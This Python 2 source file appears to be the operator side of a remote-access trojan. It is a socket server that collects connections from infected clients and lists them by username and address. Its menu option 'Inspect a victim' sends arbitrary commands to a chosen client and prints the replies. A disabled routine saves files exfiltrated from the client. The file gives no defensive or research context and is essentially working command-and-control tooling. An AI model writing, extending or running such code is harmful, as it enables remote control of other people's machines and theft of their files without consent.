import socket
import threading
import os
import sys
import uuid
from tabulate import tabulate


class Server:

    def __init__(self, hostname, port):
        self.connections = []
        self.locking = threading.Lock()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((hostname, port))
        self.socket.listen(5)

    def accept_connections(self):
        while True:
            socket, addr = self.socket.accept()
            with self.locking:
                self.connections.append(ClientConnection(socket, addr))

    def close_connections(self):
        with self.locking:
            for client in self.connections:
                client.close()

    def refresh_connections(self):
        table = []
        index = 0
        with self.locking:
            for client in self.connections:
                if client.sync():
                    table.append((index, client.username, client.adress))
                    index += 1
                else:
                    self.connections.remove(client)
        print(tabulate(table, headers=['Index', 'Name', 'Addr'],
                       tablefmt='psql'))

    def _enable_threading(self):
        thread = threading.Thread(target=self.accept_connections)
        thread.daemon = True
        thread.start()

    def run(self):
        self._enable_threading()

        while True:
            print("Items to do:\n")
            print("1) Refresh connections.")
            print("2) Inspect a victim.")
            print("0) Exit.\n")

            option = raw_input("What u want to do? ")

            if option == "1":
                os.system('clear')
                self.refresh_connections()

            elif option == "2":
                client_id = raw_input("Choose wisely: ")
                os.system('clear')
                try:
                    with self.locking:
                        client = self.connections[int(client_id)]
                    FileBrowser(client).run()
                except IndexError:
                    print("Index does not exist. \n")

            elif option == "0":
                self.close_connections()
                sys.exit(0)
            else:
                print("\nPerhaps you better start from the beginning.")
                raw_input("")
                os.system("clear")


class FileBrowser:

    def __init__(self, client):
        self.client = client

    def file_transfer(self):
        name = uuid.uuid4().hex
        f = open("received/" + name, 'wb')

        while True:
            l = self.client.socket.recv(4096)
            while (l):
                if l.endswith("EOFX"):
                    u = l[:-4]
                    f.write(u)
                    break
                else:
                    f.write(l)
                    l = self.client.socket.recv(4096)
            break
        f.close()

    def run(self):
        exit = False
        while not exit:
            command = raw_input("Type a command: ")
            if command == "exit":
                exit = True
                os.system("clear")
            elif command == "clear":
                os.system("clear")
            else:
                self.client.socket.sendall(command)
                received = self.client.socket.recv(4096)
                print(received)
                # if command.startswith("cp"):
                #     self.file_transfer()


class ClientConnection:

    def __init__(self, socket, adress):
        self.socket = socket
        self.adress = adress
        self.username = None

    def close(self):
        self.socket.shutdown(2)
        self.socket.close()

    def sync(self):
        self.socket.sendall("sync;")
        self.username = self.socket.recv(1024)
        return True if self.username else False

